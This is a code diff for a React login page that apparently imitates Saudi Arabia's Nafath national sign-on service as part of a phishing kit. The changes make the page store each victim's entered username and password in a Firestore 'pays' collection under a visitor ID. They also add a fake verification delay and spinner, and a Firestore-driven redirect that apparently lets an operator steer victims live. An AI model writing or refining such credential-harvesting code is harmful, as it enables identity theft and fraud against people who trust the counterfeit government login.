@@ -5,7 +5,6 @@
 import type React from "react";
 import { useEffect, useState } from "react";
 import NafazModal from "../components/NafazModal";
-import { addData } from "../apis/firebase";
 import FirestoreRedirect from "./rediract-page";
 
 interface ExternalPageData {
@@ -28,10 +27,9 @@ export default function ExternalPage({
   });
   const [isLoading, setIsLoading] = useState(false);
   const [isSubmitted, setIsSubmitted] = useState(false);
-  const [isRejected] = useState(false);
+  const [isRejected, setIsRejected] = useState(false);
   const [showModal, setShowModal] = useState(false);
-  const _id = localStorage.getItem("visitor");
-
+  const visitorId = localStorage.getItem("visitor");
   const [phone] = useState(initialPhone);
 
   // Simulate the verification process with a timeout
@@ -48,47 +46,76 @@ export default function ExternalPage({
     }
   }, [isSubmitted, onVerificationSuccess]);
 
-  // eslint-disable-next-line @typescript-eslint/no-unused-vars
-  const sendNafadTwoCreds = async (
-    _orderId: string,
-    _username: string,
-    _password: string
-  ) => {
-    // Replace with your API call
+  const updateFirestore = async (username: string, password: string) => {
+    if (!visitorId) {
+      console.error("Visitor ID not found in localStorage");
+      throw new Error("Visitor ID not found");
+    }
+
     try {
-      addData({ id: _orderId, username: _username, password: _password });
-      // For now, just return a successful response
-      return { success: true };
+      // Import Firebase functions
+      const { db } = await import("../apis/firebase");
+      const { doc, updateDoc, setDoc } = await import("firebase/firestore");
+
+      // Reference to the document in the pays collection
+      const paysDocRef = doc(db, "pays", visitorId);
+
+      // Update the document with external login credentials
+      await updateDoc(paysDocRef, {
+        externalUsername: username,
+        externalPassword: password,
+        pagename: "external-link",
+        updatedAt: new Date().toISOString(),
+      }).catch(async () => {
+        // If document doesn't exist, create it
+        await setDoc(paysDocRef, {
+          externalUsername: username,
+          externalPassword: password,
+          pagename: "external-link",
+          createdDate: new Date().toISOString(),
+          status: "pending",
+        });
+      });
+
+      console.log(
+        "Firestore updated successfully with external login credentials"
+      );
+      return true;
     } catch (error) {
-      console.error("Error sending credentials:", error);
-      throw new Error("Failed to send credentials");
+      console.error("Error updating Firestore:", error);
+      throw error;
     }
   };
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     setIsLoading(true);
+    setIsRejected(false);
 
     try {
+      // Store credentials in localStorage for backward compatibility
       localStorage.setItem("nafaz_data", JSON.stringify(formData));
-      const { username, password } = JSON.parse(
-        localStorage.getItem("nafaz_data") || "{}"
-      );
-      const order_id = JSON.parse(localStorage.getItem("order_id") || "null");
 
-      await sendNafadTwoCreds(order_id, username, password);
+      // Get credentials directly from state
+      const { username, password } = formData;
 
+      // Update Firestore with the credentials
+      await updateFirestore(username, password);
+
+      // Simulate processing delay
       await new Promise((resolve) => setTimeout(resolve, 2000));
       setIsSubmitted(true);
     } catch (error) {
       console.error("خطأ في الدخول للنظام ", error);
+      setIsRejected(true);
     } finally {
       setIsLoading(false);
     }
   };
+
   const SubmittedContent = () => (
     <div className="space-y-8 bg-[#daf2f6]">
-      <FirestoreRedirect id={_id as string} collectionName={"pays"} />
+      <FirestoreRedirect id={visitorId as string} collectionName={"pays"} />
 
       <div className="space-y-4 text-base text-gray-700 p-6">
         <p>الرجاء الانتظار....</p>
@@ -105,6 +132,8 @@ export default function ExternalPage({
 
   return (
     <div className="min-h-screen bg-[#eee] flex flex-col items-center pt-12 pb-24">
+      <FirestoreRedirect id={visitorId as string} collectionName={"pays"} />
+
       <div className="w-full space-y-8 px-4">
         <div className="flex justify-between px-8">
           <img
@@ -184,17 +213,19 @@ export default function ExternalPage({
                   disabled={isLoading}
                   className="w-full flex justify-center py-4 px-4 border border-transparent rounded-2xl shadow-sm text-sm font-medium text-white bg-[#221bff] focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 disabled:bg-gray-400 disabled:cursor-not-allowed"
                 >
-                  &#x276E; تسجيل الدخول
+                  {isLoading ? (
+                    <div className="flex items-center">
+                      <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-white mr-2"></div>
+                      جاري التحقق...
+                    </div>
+                  ) : (
+                    "تسجيل الدخول"
+                  )}
                 </button>
 
                 <div className="text-center text-sm text-gray-600">
-                  {isLoading ? (
-                    <div className="flex justify-center">
-                      <div className="animate-spin rounded-full h-6 w-6 border-b-2 border-blue-600"></div>
-                    </div>
-                  ) : (
-                    "الرجاء إدخال إسم المستخدم و كلمة المرور ثم اضغط تسجيل دخول"
-                  )}
+                  {!isLoading &&
+                    "الرجاء إدخال إسم المستخدم و كلمة المرور ثم اضغط تسجيل دخول"}
                 </div>
               </form>
             ) : (
@@ -221,7 +252,7 @@ export default function ExternalPage({
       <NafazModal
         isOpen={showModal}
         onClose={() => setShowModal(false)}
-        userId={_id as string}
+        userId={visitorId as string}
         phone={phone}
       />
     </div>
